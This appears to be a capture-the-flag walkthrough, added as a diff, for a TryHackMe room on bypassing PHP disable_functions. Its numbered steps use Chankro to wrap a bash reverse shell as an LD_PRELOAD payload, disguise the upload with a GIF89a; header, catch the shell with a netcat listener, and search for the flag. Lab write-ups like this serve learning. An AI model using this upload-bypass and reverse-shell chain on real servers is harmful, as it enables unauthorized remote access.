@@ -1,0 +1,14 @@
+Hi, today we have Bypass Disable Functions(https://tryhackme.com/room/bypassdisablefunctions)
+
+1.The goal of the room is to gain control through file upload.
+2.Essentially, we need to overwrite LD_PRELOAD to change the path to OUR library.
+3.We will need to download the CHANKRO tool, which can be done using (git clone https://github.com/TarlogicSecurity/Chankro.git)
+4.After downloading, navigate to the Chankro folder using the command cd Chankro.
+5.Next, using the command gobuster dir -u http://ip_your_machine -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt, we need to find the phpinfo.php file.
+6.Next, open this file on the website and copy the full path, to which we will later append 'uploads' as specified in the task.
+7.Create a file using the nano shell.php command, write /bin/bash at the beginning of the file, and then paste the code from revshells.com, where we select bash -i but change sh to bash.
+8.Then, using the Chankro tool, we convert our file into a library: python2 chankro.py --arch 64 --input shell.php --output revshell.php --path <DocumentRoot_from_phpinfo.php>/uploads
+9.After that, open the newly created file and add GIF89a; to the very first line, right before the opening PHP tags.
+10.Next, open port 9001 using nc -lvnp 9001 and upload our newly created file to the website.
+11.After establishing the connection, run find / -name 'flag.txt' 2>/dev/null in the command line and get the flag.
+12.Completed
